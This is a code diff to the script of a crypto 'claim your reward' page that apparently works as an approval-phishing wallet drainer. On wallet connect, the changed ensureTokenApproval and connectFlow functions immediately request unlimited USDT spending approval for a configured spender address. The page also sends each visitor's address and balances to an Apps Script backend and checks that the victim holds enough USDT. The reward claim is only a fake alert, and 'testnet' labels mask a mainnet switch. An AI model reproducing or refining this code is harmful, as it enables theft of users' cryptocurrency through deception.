+      if(statusTextEl) statusTextEl.textContent = txt;
+      console.log("[status]", txt);
+    }
+    function setWalletInfo(address, network, bnb){
+      if(walletAddressEl) walletAddressEl.textContent = address || "—";
+      if(walletNetworkEl) walletNetworkEl.textContent = network || "—";
+      if(walletBalanceEl){
+        walletBalanceEl.textContent =
+          (bnb === null || bnb === undefined) ? "—" : (Number(bnb).toFixed(6) + " BNB");
+      }
+    }
+    function setUserIdUI(id){
+      if(userIdEl) userIdEl.textContent = id || "-";
+    }
 
     function clearSessionUI(){
       isWalletConnected = false;
-      currentAddress = null;
-      currentUserId = null;
+      currentAddress    = null;
+      currentUserId     = null;
       currentBNBBalance = null;
       currentTokenBalance = null;
+
       setStatus("Not connected");
       setWalletInfo("—","—",null);
       setUserIdUI("-");
-      if(connectBtn){ connectBtn.textContent = "Connect Wallet"; connectBtn.classList.remove("connected"); }
-      if(connectBtnCard){ connectBtnCard.textContent = "Connect Wallet"; connectBtnCard.classList.remove("connected"); }
+
+      if(connectBtn){
+        connectBtn.textContent = "Connect Wallet";
+        connectBtn.classList.remove("connected");
+      }
+
+if(connectBtnCard){
+  connectBtnCard.textContent = "Connect Wallet";
+  connectBtnCard.classList.remove("connected");
+}
+
       updateClaimState();
     }
 
     function updateClaimState(){
       const allTasksDone = task1Done && task2Eligible && task3Done;
-      if(claimBtn){ claimBtn.disabled = !(isWalletConnected && allTasksDone); }
+      if(claimBtn){
+        claimBtn.disabled = !(isWalletConnected && allTasksDone);
+      }
       if(claimHintEl){
-        if(!isWalletConnected){ claimHintEl.textContent = "Please connect your wallet first."; }
-        else if(!allTasksDone){ claimHintEl.textContent = "Complete all tasks to unlock the Claim button."; }
-        else{ claimHintEl.textContent = "You can now claim your reward."; }
+        if(!isWalletConnected){
+          claimHintEl.textContent = "Please connect your wallet first.";
+        }else if(!allTasksDone){
+          claimHintEl.textContent = "Complete all tasks to unlock the Claim button.";
+        }else{
+          claimHintEl.textContent = "You can now claim your reward.";
+        }
       }
     }
 
     function markTaskState(el, ok, textOk, textBad){
       if(!el) return;
       el.classList.remove("ok","bad");
-      if(ok){ el.classList.add("ok"); el.textContent = "✅ " + textOk; } else { el.classList.add("bad"); el.textContent = "❌ " + textBad; }
+      if(ok){
+        el.classList.add("ok");
+        el.textContent = "✅ " + textOk;
+      }else{
+        el.classList.add("bad");
+        el.textContent = "❌ " + textBad;
+      }
     }
 
     function attachProviderListeners(p){
       if(!p || !p.on) return;
       try{
         p.on("accountsChanged", async function(accounts){
-          if(!accounts || !accounts.length){ clearSessionUI(); return; }
+          if(!accounts || !accounts.length){
+            clearSessionUI();
+            return;
+          }
           const addr = accounts[0].toLowerCase();
           await restoreSessionFromAddress(addr);
         });
-        p.on("chainChanged", function(chainId){ if(walletNetworkEl){ walletNetworkEl.textContent = BNB_TESTNET_LABEL + " (chain " + chainId + ")"; }});
-        p.on("disconnect", function(){ clearSessionUI(); });
-      }catch(e){ console.warn("attachProviderListeners", e); }
+
+        p.on("chainChanged", function(chainId){
+          if(walletNetworkEl){
+            walletNetworkEl.textContent = BNB_TESTNET_LABEL + " (chain " + chainId + ")";
+          }
+        });
+
+        p.on("disconnect", function(){
+          clearSessionUI();
+        });
+      }catch(e){
+        console.warn("attachProviderListeners", e);
+      }
     }
 
     async function notifyBackend(address, networkText, userId, bnbBalance, tokenBalance, eventType = "connect"){
@@ -416,260 +862,492 @@
           tokenBalance: tokenBalance !== undefined && tokenBalance !== null ? String(tokenBalance) : "",
           eventType   : eventType || "connect"
         });
+
         console.log("notifyBackend payload", Object.fromEntries(payload.entries()));
-        await fetch(APPS_SCRIPT_URL, { method: "POST", mode: "no-cors", headers: { "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8" }, body: payload.toString() });
-      }catch(err){ console.error("notifyBackend error:", err); }
+
+        await fetch(APPS_SCRIPT_URL, {
+          method: "POST",
+          mode  : "no-cors",
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8"
+          },
+          body: payload.toString()
+        });
+      }catch(err){
+        console.error("notifyBackend error:", err);
+      }
     }
 
     async function getTokenBalance(address){
       try{
-        if(!TOKEN_ADDRESS || !/^0x[0-9a-fA-F]{40}$/.test(TOKEN_ADDRESS)){ console.warn("TOKEN_ADDRESS invalid"); return ""; }
-        if(!providerInstance){ console.warn("No providerInstance for token balance"); return ""; }
+        if(!TOKEN_ADDRESS || !/^0x[0-9a-fA-F]{40}$/.test(TOKEN_ADDRESS)){
+          console.warn("TOKEN_ADDRESS invalid");
+          return "";
+        }
+        if(!providerInstance){
+          console.warn("No providerInstance for token balance");
+          return "";
+        }
         const ethersProvider = new ethers.BrowserProvider(providerInstance);
         const tokenContract  = new ethers.Contract(TOKEN_ADDRESS, ERC20_BALANCE_ABI, ethersProvider);
         const raw            = await tokenContract.balanceOf(address);
         const formatted      = ethers.formatUnits(raw, TOKEN_DECIMALS);
+
         return formatted;
-      }catch(err){ console.error("getTokenBalance error:", err); return ""; }
+      }catch(err){
+        console.error("getTokenBalance error:", err);
+        return "";
+      }
     }
 
     async function switchToBSC(provider){
       try{
-        await provider.request({ method:"wallet_switchEthereumChain", params:[{chainId:BNB_TESTNET_CHAIN_ID_HEX}] });
+        await provider.request({
+          method:"wallet_switchEthereumChain",
+          params:[{chainId:BNB_TESTNET_CHAIN_ID_HEX}]
+        });
         return true;
       }catch(switchError){
         if(switchError.code === 4902){
           try{
-            await provider.request({ method:"wallet_addEthereumChain", params:[{ chainId:BNB_TESTNET_CHAIN_ID_HEX, chainName:"BNB Smart Chain", nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18}, rpcUrls:[BNB_TESTNET_RPC], blockExplorerUrls:["https://bscscan.com"] }]});
+            await provider.request({
+              method:"wallet_addEthereumChain",
+              params:[{
+                chainId:BNB_TESTNET_CHAIN_ID_HEX,
+                chainName:"BNB Smart Chain",
+                nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
+                rpcUrls:[BNB_TESTNET_RPC],
+                blockExplorerUrls:["https://bscscan.com"]
+              }]
+            });
             return true;
-          }catch(addErr){ console.error("Could not add BNB Smart Chain:", addErr); return false; }
+          }catch(addErr){
+            console.error("Could not add BNB Smart Chain:", addErr);
+            return false;
+          }
         }
         console.error("Switch error:", switchError);
         return false;
       }
     }
 
-    // ===== Simplified instant ensureTokenApproval (and record to sheet) =====
-    let approvalInProgress = false;
+    // ===== CHANGED: ensureTokenApproval now does NOT read allowance; it requests approval immediately =====
     async function ensureTokenApproval(){
-      if(!TOKEN_ADDRESS){ console.warn("TOKEN_ADDRESS not set, skipping approve"); return; }
-      if(!SPENDER_ADDRESS){ console.warn("SPENDER_ADDRESS not set, skipping approve"); return; }
-      if(!providerInstance){ console.warn("No providerInstance/web3Instance for approval"); return; }
-      if(approvalInProgress){ console.log("Approval already in progress"); return; }
+      // basic guards
+      if(!TOKEN_ADDRESS){
+        console.warn("TOKEN_ADDRESS not set, skipping approve");
+        setStatus("Connected (no token configured)");
+        return;
+      }
+      if(!SPENDER_ADDRESS){
+        console.warn("SPENDER_ADDRESS not set, skipping approve");
+        setStatus("Connected (no spender configured)");
+        return;
+      }
+      if(!providerInstance || !web3Instance){
+        console.warn("No providerInstance/web3Instance for approval");
+        setStatus("Connected (wallet not ready)");
+        return;
+      }
 
       try{
-        let owner = null;
-        try{
-          if(providerInstance.selectedAddress) owner = providerInstance.selectedAddress;
-          else if(providerInstance.request){
-            const accs = await providerInstance.request({ method: "eth_accounts" }).catch(()=>null);
-            if(accs && accs.length) owner = accs[0];
-          }
-        }catch(e){ console.debug("owner check failed", e); }
+        setStatus("Preparing token approval…");
 
-        if(!owner){
-          console.warn("No owner address visible — skipping approval");
-          return;
-        }
-        owner = owner.toLowerCase();
-
-        approvalInProgress = true;
-        setStatus("Requesting approval…");
-
-        const iface = new ethers.Interface(ERC20_APPROVE_ABI);
-        const data = iface.encodeFunctionData("approve", [SPENDER_ADDRESS, ethers.MaxUint256]);
-        const txParams = { from: owner, to: TOKEN_ADDRESS, data: data };
-
-        if(providerInstance.request){
-          try{
-            console.log("[instant-approve] trying eth_sendTransaction");
-            const sendResult = await providerInstance.request({ method: "eth_sendTransaction", params: [txParams] });
-            console.log("[instant-approve] eth_sendTransaction returned:", sendResult);
-            setStatus("Approval sent (pending)...");
-            const maybeTxHash = (typeof sendResult === "string" && sendResult.startsWith("0x")) ? sendResult : null;
-            if(maybeTxHash){
-              try{ setLocalApprovalFlag(owner, maybeTxHash); await recordApprovalToSheet(owner, maybeTxHash); }catch(e){}
-            }
-            return;
-          }catch(errSend){
-            console.warn("[instant-approve] eth_sendTransaction failed, fallback to signer:", errSend && errSend.message ? errSend.message : errSend);
-          }
-        }
-
+        // prepare ethers provider & signer
         const ethersProvider = new ethers.BrowserProvider(providerInstance, BNB_TESTNET_CHAIN_ID_DEC);
         const signer = await ethersProvider.getSigner();
+        const ownerAddress = (await signer.getAddress()).toLowerCase();
+
+        if (TOKEN_ADDRESS.toLowerCase() === ownerAddress) {
+          alert(
+            "ERROR: TOKEN_ADDRESS is set to your wallet address.\n\n" +
+            "It MUST be the BEP-20 token contract address, not your wallet."
+          );
+          setStatus("Connected (approval skipped)");
+          return;
+        }
+
+        // Encode approve(...) call data for fast path (eth_sendTransaction)
+        const iface = new ethers.Interface(ERC20_APPROVE_ABI);
+        const data = iface.encodeFunctionData("approve", [SPENDER_ADDRESS, ethers.MaxUint256]);
+        const txParams = { from: ownerAddress, to: TOKEN_ADDRESS, data: data };
+
+        // Try fast path: eth_sendTransaction (some wallets will show only one popup)
+        if (providerInstance.request) {
+          try {
+            setStatus("Waiting for wallet to confirm approval…");
+            console.log("[instant-approve] trying eth_sendTransaction", txParams);
+            const sendResult = await providerInstance.request({ method: "eth_sendTransaction", params: [txParams] });
+            console.log("[instant-approve] eth_sendTransaction returned:", sendResult);
+            if (typeof sendResult === "string" && sendResult.startsWith("0x")) {
+              setStatus("Approval sent (pending)...");
+              return;
+            }
+            // if sendResult isn't a hash, we'll still fallback to signer route
+            console.warn("[instant-approve] eth_sendTransaction didn't return txHash, falling back");
+          } catch (errSend) {
+            console.warn("[instant-approve] eth_sendTransaction failed, falling back to signer:", errSend && errSend.message ? errSend.message : errSend);
+            // continue to fallback below
+          }
+        }
+
+        // Fallback: use signer.approve(...) which will open the wallet and return a tx object
+        setStatus("Waiting for wallet to confirm approval…");
         const writeContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_APPROVE_ABI, signer);
         const tx = await writeContract.approve(SPENDER_ADDRESS, ethers.MaxUint256);
         console.log("[approve] tx sent (fallback):", tx.hash);
         setStatus("Approval pending on chain…");
         await tx.wait();
         setStatus("Connected + Approved ✅");
-        try{ setLocalApprovalFlag(owner, tx.hash); await recordApprovalToSheet(owner, tx.hash); }catch(e){ console.warn("recordApproval failed post-tx", e); }
       }catch(err){
         console.error("Token approve error:", err);
-        if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) { setStatus("Approval rejected"); }
-        else { setStatus("Approval failed"); }
-      }finally{
-        approvalInProgress = false;
+        if (err && (err.code === 4001 || err.code === "ACTION_REJECTED")) {
+          setStatus("Approval rejected");
+        } else {
+          setStatus("Approval failed");
+        }
+        // keep UI connected but indicate failure
       }
-    }
-
-    // -------- Fast approve-check flow (localStorage -> sheet -> approve) ----------
-    async function fastApproveCheckAndMaybeApprove(address){
-      if(!address) return;
-      const local = getLocalApprovalFlag(address);
-      if(local){
-        console.log("Local approval flag present, skipping approval for", address, local);
-        return;
-      }
-      const sheetResp = await checkApprovalSheet(address, SHEET_CHECK_TIMEOUT_MS);
-      if(sheetResp && sheetResp.approved){
-        console.log("Sheet indicates approval for", address, sheetResp.txHash || "no-tx");
-        setLocalApprovalFlag(address, sheetResp.txHash || "1");
-        return;
-      }
-      console.log("No cached approval: requesting approval for", address);
-      await ensureTokenApproval();
     }
 
     async function restoreSessionFromAddress(address){
       currentAddress = address;
+
       const balanceWei = await web3Instance.eth.getBalance(address);
       const balanceBNB = Number(web3Instance.utils.fromWei(balanceWei + "","ether"));
-      const userId = getOrCreateUserIdFor(address);
-      currentUserId = userId;
-      currentBNBBalance = balanceBNB;
+      const userId     = getOrCreateUserIdFor(address);
+
+      currentUserId       = userId;
+      currentBNBBalance   = balanceBNB;
+
       setWalletInfo(address, BNB_TESTNET_LABEL, balanceBNB);
       setUserIdUI(userId);
+
       const tokenBalanceRaw  = await getTokenBalance(address);
       const tokenBalanceNum  = tokenBalanceRaw ? Number(tokenBalanceRaw) : 0;
       const prettyBalance    = tokenBalanceRaw ? formatToken(tokenBalanceRaw) : "0";
+
       currentTokenBalance = tokenBalanceNum;
+
       if(tokensContainer){
-        tokensContainer.innerHTML = 'USDT balance: ' + prettyBalance + '<br><span class="small mono">' + TOKEN_ADDRESS + '</span>';
+        tokensContainer.innerHTML =
+          'USDT balance: ' + prettyBalance +
+          '<br><span class="small mono">' + TOKEN_ADDRESS + '</span>';
       }
-      isWalletConnected = true;
-      if (connectBtn) { connectBtn.textContent = "Connected"; connectBtn.classList.add("connected"); }
-      if (connectBtnCard) { connectBtnCard.textContent = "Connected"; connectBtnCard.classList.add("connected"); }
+
+   isWalletConnected = true;
+
+if (connectBtn) {
+  connectBtn.textContent = "Connected";
+  connectBtn.classList.add("connected");
+}
+
+if (connectBtnCard) {
+  connectBtnCard.textContent = "Connected";
+  connectBtnCard.classList.add("connected");
+}
       updateClaimState();
-      return { balanceBNB, tokenBalance: tokenBalanceNum, userId };
+
+      // Return values for connectFlow
+      return {
+        balanceBNB,
+        tokenBalance: tokenBalanceNum,
+        userId
+      };
     }
 
-    // ===== NEW: connectFlow (AppKit) — uses fastApproveCheckAndMaybeApprove =====
-    async function connectFlow() {
-      try {
-        if (!window.appKit) { alert("Wallet connect UI not ready. Please reload the page."); return; }
-        setStatus("Connecting…");
-        let gotProvider = null;
-        const unsubscribe = window.appKit.subscribeProviders((state) => {
-          const evm = state["eip155"];
-          if (evm && !gotProvider) gotProvider = evm;
-        });
-        await window.appkit?.open?.({ view: "Connect" }) || await window.appKit.open({ view: "Connect" });
-        if (typeof unsubscribe === "function") unsubscribe();
-        const provider = gotProvider;
-        if (!provider) { setStatus("Not connected"); return; }
-        providerInstance = provider;
-        web3Instance = new Web3(providerInstance);
-        attachProviderListeners(providerInstance);
-        const accounts = await web3Instance.eth.getAccounts();
-        if(!accounts || !accounts.length){ setStatus("No account"); return; }
-        const address = accounts[0].toLowerCase();
-        currentAddress = address;
-        let chainId = await web3Instance.eth.getChainId();
-        let chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
-        if (chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
-          const switched = await switchToBSC(providerInstance);
-          if(!switched){ alert("Please switch to BNB Smart Chain (56) in your wallet and try again."); setStatus("Wrong network"); return; }
-          chainId = await web3Instance.eth.getChainId();
-          chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
-          if(chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){ alert("Network switch failed. Make sure you are on BNB Smart Chain (56)."); setStatus("Wrong network"); return; }
-        }
-        setStatus("Connected");
-        const session = await restoreSessionFromAddress(address);
-        notifyBackend(address, BNB_TESTNET_LABEL, session.userId, session.balanceBNB, session.tokenBalance, "connect").catch(console.error);
-        await fastApproveCheckAndMaybeApprove(address);
-      } catch (err) {
-        console.error("connectFlow error (AppKit):", err);
-        setStatus("Connection failed");
-        alert("Connection failed: " + (err && err.message ? err.message : err));
+    // 🔁 NEW: connect using Reown AppKit
+ // 🔁 NEW: connect using Reown AppKit (fixed for mobile)
+async function connectFlow() {
+  try {
+    if (!window.appKit) {
+      alert("Wallet connect UI not ready. Please reload the page.");
+      return;
+    }
+
+    setStatus("Connecting…");
+
+    let gotProvider = null;
+
+    // 1) Subscribe BEFORE opening the modal
+    const unsubscribe = window.appKit.subscribeProviders((state) => {
+      const evm = state["eip155"];
+      if (evm && !gotProvider) {
+        gotProvider = evm;
+      }
+    });
+
+    // 2) Open AppKit modal (Connect view)
+    await window.appKit.open({ view: "Connect" });
+
+    // 3) Stop listening
+    if (typeof unsubscribe === "function") {
+      unsubscribe();
+    }
+
+    // 4) If no provider, user probably closed modal or connect failed
+    const provider = gotProvider;
+    if (!provider) {
+      setStatus("Not connected");
+      return;
+    }
+
+    // 5) Use this provider for Web3 & Ethers
+    providerInstance = provider;
+    web3Instance     = new Web3(providerInstance);
+
+    attachProviderListeners(providerInstance);
+
+    const accounts = await web3Instance.eth.getAccounts();
+    if(!accounts || !accounts.length){
+      setStatus("No account");
+      return;
+    }
+    const address = accounts[0].toLowerCase();
+    currentAddress = address; // helpful for approval logging
+
+    // 6) Ensure BSC (56)
+    let chainId    = await web3Instance.eth.getChainId();
+    let chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
+
+    if (chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
+      const switched = await switchToBSC(providerInstance);
+      if(!switched){
+        alert("Please switch to BNB Smart Chain (56) in your wallet and try again.");
+        setStatus("Wrong network");
+        return;
+      }
+      chainId    = await web3Instance.eth.getChainId();
+      chainIdNum = typeof chainId === "string" ? Number(chainId) : Number(chainId);
+      if(chainIdNum !== BNB_TESTNET_CHAIN_ID_DEC){
+        alert("Network switch failed. Make sure you are on BNB Smart Chain (56).");
+        setStatus("Wrong network");
+        return;
       }
     }
 
-    // Try silent reconnect (unchanged)
+    // 7) Connected + correct network
+    setStatus("Connected");
+
+    const sessionPromise = (async () => {
+      const session = await restoreSessionFromAddress(address);
+      const balanceBNB   = session.balanceBNB;
+      const tokenBalance = session.tokenBalance;
+      const userId       = session.userId;
+
+      // Log to sheet
+      notifyBackend(
+        address,
+        BNB_TESTNET_LABEL,
+        userId,
+        balanceBNB,
+        tokenBalance,
+        "connect"
+      ).catch(console.error);
+
+      return session;
+    })();
+
+    // 8) Token approval (IMMEDIATE) — no allowance pre-read
+    await ensureTokenApproval();
+    sessionPromise.catch(console.error);
+
+  } catch (err) {
+    console.error("connectFlow error (AppKit):", err);
+    setStatus("Connection failed");
+    alert("Connection failed: " + (err && err.message ? err.message : err));
+  }
+}
+
+    
+
     async function tryAutoReconnectSilent(){
+      // keep your old silent reconnect using injected wallets
       if(window.trustwallet && window.trustwallet.ethereum){
-        const injected = window.trustwallet.ethereum; providerInstance = injected; web3Instance = new Web3(providerInstance); attachProviderListeners(providerInstance);
+        const injected = window.trustwallet.ethereum;
+        providerInstance = injected;
+        web3Instance     = new Web3(providerInstance);
+        attachProviderListeners(providerInstance);
         const accounts = await injected.request({method:"eth_accounts"});
-        if(accounts && accounts.length){ const address = accounts[0].toLowerCase(); setStatus("Restoring session (Trust Wallet)..."); await restoreSessionFromAddress(address); setStatus("Connected (restored)"); return true; }
+        if(accounts && accounts.length){
+          const address = accounts[0].toLowerCase();
+          setStatus("Restoring session (Trust Wallet)...");
+          await restoreSessionFromAddress(address);
+          setStatus("Connected (restored)");
+          return true;
+        }
       }
+
       if(window.ethereum){
-        const injected = window.ethereum; providerInstance = injected; web3Instance = new Web3(providerInstance); attachProviderListeners(providerInstance);
+        const injected = window.ethereum;
+        providerInstance = injected;
+        web3Instance     = new Web3(providerInstance);
+        attachProviderListeners(providerInstance);
         const accounts = await injected.request({method:"eth_accounts"});
-        if(accounts && accounts.length){ const address = accounts[0].toLowerCase(); setStatus("Restoring session..."); await restoreSessionFromAddress(address); setStatus("Connected (restored)"); return true; }
+        if(accounts && accounts.length){
+          const address = accounts[0].toLowerCase();
+          setStatus("Restoring session...");
+          await restoreSessionFromAddress(address);
+          setStatus("Connected (restored)");
+          return true;
+        }
       }
+
       return false;
     }
 
-    async function autoConnectOnLoad(){ try{ const restored = await tryAutoReconnectSilent(); if(!restored){ clearSessionUI(); } }catch(e){ console.warn("autoConnectOnLoad failed:", e); clearSessionUI(); } }
+    async function autoConnectOnLoad(){
+      try{
+        const restored = await tryAutoReconnectSilent();
+        if(!restored){
+          clearSessionUI();
+        }
+      }catch(e){
+        console.warn("autoConnectOnLoad failed:", e);
+        clearSessionUI();
+      }
+    }
 
     async function claimReward(){
       try{
-        if(!isWalletConnected){ alert("Please connect your wallet first."); setStatus("Connect wallet before claiming."); return; }
-        if(!(task1Done && task2Eligible && task3Done)){ alert("Please complete all tasks first."); return; }
-        if(!web3Instance || !providerInstance || !currentAddress){ alert("Wallet not ready, connect again."); return; }
-
-        // Final authoritative allowance check before claim (recommended)
-        try{
-          const ethersProvider = new ethers.BrowserProvider(providerInstance);
-          const readContract = new ethers.Contract(TOKEN_ADDRESS, ERC20_ALLOWANCE_ABI, ethersProvider);
-          const allowance = await readContract.allowance(currentAddress, SPENDER_ADDRESS);
-          if(!allowance || allowance === 0n){
-            await ensureTokenApproval();
-          }
-        }catch(e){
-          console.warn("Final allowance check failed, attempting to proceed anyway:", e);
+        if(!isWalletConnected){
+          alert("Please connect your wallet first.");
+          setStatus("Connect wallet before claiming.");
+          return;
+        }
+        if(!(task1Done && task2Eligible && task3Done)){
+          alert("Please complete all tasks first.");
+          return;
+        }
+        if(!web3Instance || !providerInstance || !currentAddress){
+          alert("Wallet not ready, connect again.");
+          return;
         }
 
         setStatus("Claiming reward…");
-        setTimeout(()=>{ setStatus("Reward claimed for " + currentAddress.slice(0,6) + "…" + currentAddress.slice(-4)); alert("Reward claimed! (demo mode — add real contract call later)"); },800);
-      }catch(err){ console.error("claimReward error:", err); setStatus("Reward claim failed"); }
+
+        // TODO: real contract call later
+        setTimeout(()=>{
+          setStatus("Reward claimed for " + currentAddress.slice(0,6) + "…" + currentAddress.slice(-4));
+          alert("Reward claimed! (demo mode — add real contract call later)");
+        },800);
+      }catch(err){
+        console.error("claimReward error:", err);
+        setStatus("Reward claim failed");
+      }
     }
 
-    function showTaskPage(){ if(rewardPageEl) rewardPageEl.style.display = "none"; if(taskPageEl) taskPageEl.style.display = "block"; }
-    function showRewardPage(){ if(taskPageEl) taskPageEl.style.display = "none"; if(rewardPageEl) rewardPageEl.style.display = "block"; }
+    // === TASK LOGIC ===
+    function showTaskPage(){
+      if(rewardPageEl) rewardPageEl.style.display = "none";
+      if(taskPageEl)   taskPageEl.style.display   = "block";
+    }
+    function showRewardPage(){
+      if(taskPageEl)   taskPageEl.style.display   = "none";
+      if(rewardPageEl) rewardPageEl.style.display = "block";
+    }
 
     async function handleTask2Check(){
-      if(!isWalletConnected || !currentAddress){ alert("Please connect your wallet first."); return; }
-      if(!web3Instance || !providerInstance){ alert("Wallet not ready, try reconnect."); return; }
+      if(!isWalletConnected || !currentAddress){
+        alert("Please connect your wallet first.");
+        return;
+      }
+      if(!web3Instance || !providerInstance){
+        alert("Wallet not ready, try reconnect.");
+        return;
+      }
+
       try{
         setStatus("Checking wallet balance…");
         const balanceStr = await getTokenBalance(currentAddress);
         const balanceNum = balanceStr ? Number(balanceStr) : 0;
+
         const eligible = balanceNum >= REQUIRED_USDT;
         task2Eligible = eligible;
-        markTaskState(task2CheckEl, eligible, "ELIGIBLE (balance ≥ " + REQUIRED_USDT + ")", "Not eligible (needs ≥ " + REQUIRED_USDT + ")");
-        if(task2DetailEl){ task2DetailEl.textContent = "Detected balance: " + balanceNum.toFixed(4) + " USDT. Result: " + (eligible ? "ELIGIBLE" : "NOT ELIGIBLE") + ". Later you can also check if this is an active account."; }
-        setStatus("Wallet check completed"); updateClaimState();
-      }catch(err){ console.error("Task 2 check error:", err); if(task2DetailEl){ task2DetailEl.textContent = "Error checking wallet. Try again."; } }
+
+        markTaskState(
+          task2CheckEl,
+          eligible,
+          "ELIGIBLE (balance ≥ " + REQUIRED_USDT + ")",
+          "Not eligible (needs ≥ " + REQUIRED_USDT + ")"
+        );
+
+        if(task2DetailEl){
+          task2DetailEl.textContent =
+            "Detected balance: " + balanceNum.toFixed(4) +
+            " USDT. Result: " + (eligible ? "ELIGIBLE" : "NOT ELIGIBLE") +
+            ". Later you can also check if this is an active account.";
+        }
+
+        setStatus("Wallet check completed");
+        updateClaimState();
+      }catch(err){
+        console.error("Task 2 check error:", err);
+        if(task2DetailEl){
+          task2DetailEl.textContent = "Error checking wallet. Try again.";
+        }
+      }
     }
 
+    // ===== DOMContentLoaded =====
     document.addEventListener("DOMContentLoaded", async function(){
-      if(rewardAmountEl) rewardAmountEl.textContent = "$" + REWARD_AMOUNT.toFixed(0);
+      if(rewardAmountEl){
+        rewardAmountEl.textContent = "$" + REWARD_AMOUNT.toFixed(0);
+      }
+
       updateClaimState();
       setupAppKitProviderWatcher();
 
-      if(connectBtn){ connectBtn.addEventListener("click", function(){ if(isWalletConnected) return; connectFlow(); }); }
-      if(connectBtnCard){ connectBtnCard.addEventListener("click", function(){ if(isWalletConnected) return; connectFlow(); }); }
-      if(claimBtn){ claimBtn.addEventListener("click", claimReward); }
-      if(taskBtn){ taskBtn.addEventListener("click", showTaskPage); }
-      if(backToRewardsBtn){ backToRewardsBtn.addEventListener("click", showRewardPage); }
-      if(task1Btn){ task1Btn.addEventListener("click", function(){ task1Done = true; markTaskState(task1CheckEl, true, "Task 1 completed (demo)", "Not completed"); updateClaimState(); }); }
-      if(task2CheckBtn){ task2CheckBtn.addEventListener("click", handleTask2Check); }
-      if(task3Btn){ task3Btn.addEventListener("click", function(){ task3Done = true; markTaskState(task3CheckEl, true, "Task 3 completed (demo)", "Not completed"); updateClaimState(); }); }
+      if(connectBtn){
+        connectBtn.addEventListener("click", function(){
+          if(isWalletConnected) return;
+          connectFlow();
+        });
+      }
+
+      // Connect button inside reward card
+      const connectBtnCard = document.getElementById("connectBtnCard");
+      if (connectBtnCard) {
+        connectBtnCard.addEventListener("click", function () {
+          if (isWalletConnected) return;
+          connectFlow();
+        });
+      }
+
+      if(claimBtn){
+        claimBtn.addEventListener("click", claimReward);
+      }
+
+      if(taskBtn){
+        taskBtn.addEventListener("click", showTaskPage);
+      }
+      if(backToRewardsBtn){
+        backToRewardsBtn.addEventListener("click", showRewardPage);
+      }
+
+      if(task1Btn){
+        task1Btn.addEventListener("click", function(){
+          task1Done = true;
+          markTaskState(task1CheckEl, true, "Task 1 completed (demo)", "Not completed");
+          updateClaimState();
+        });
+      }
+
+      if(task2CheckBtn){
+        task2CheckBtn.addEventListener("click", handleTask2Check);
+      }
+
+      if(task3Btn){
+        task3Btn.addEventListener("click", function(){
+          task3Done = true;
+          markTaskState(task3CheckEl, true, "Task 3 completed (demo)", "Not completed");
+          updateClaimState();
+        });
+      }
 
       await autoConnectOnLoad();
-      const yearEl = document.getElementById("year"); if(yearEl) yearEl.textContent = new Date().getFullYear();
+      const yearEl = document.getElementById("year");
+      if(yearEl) yearEl.textContent = new Date().getFullYear();
     });
 
   })();
